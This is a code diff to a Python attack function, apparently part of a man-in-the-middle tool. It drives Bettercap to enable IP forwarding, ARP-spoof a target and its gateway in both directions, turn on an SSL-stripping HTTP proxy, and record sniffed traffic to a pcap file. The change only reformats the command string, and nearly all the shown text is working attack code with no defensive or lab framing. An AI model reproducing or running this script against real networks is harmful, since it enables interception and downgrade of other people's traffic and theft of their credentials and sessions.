@@ -28,19 +28,19 @@ def mitm_sslstrip(target_ip: str, gateway_ip: str, iface: str = "eth0", pcap_out
     subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], check=True)
     print(f"[+] IP forwarding enabled (was: {original_ip_forward})")
 
-    # --- Build Bettercap commands (gateway_ip is now actually used) ---
-    commands = f"""
-set arp.spoof.targets {target_ip}
-set arp.spoof.gateway {gateway_ip}
-set arp.spoof.fullduplex true
-arp.spoof on
-set http.proxy.sslstrip true
-http.proxy on
-set net.sniff.verbose true
-set net.sniff.output {pcap_path}
-net.sniff on
-session.idle.timeout 0
-"""
+    # --- Build Bettercap commands (semicolon-separated, as -eval expects) ---
+    commands = (
+        f"set arp.spoof.targets {target_ip}; "
+        f"set arp.spoof.spoofed {gateway_ip}; "
+        f"set arp.spoof.fullduplex true; "
+        f"arp.spoof on; "
+        f"set http.proxy.sslstrip true; "
+        f"http.proxy on; "
+        f"set net.sniff.verbose true; "
+        f"set net.sniff.output {pcap_path}; "
+        f"net.sniff on; "
+        f"session.idle.timeout 0"
+    )
 
     # --- Launch Bettercap (no pipe capture → no stall risk) ---
     proc = subprocess.Popen(
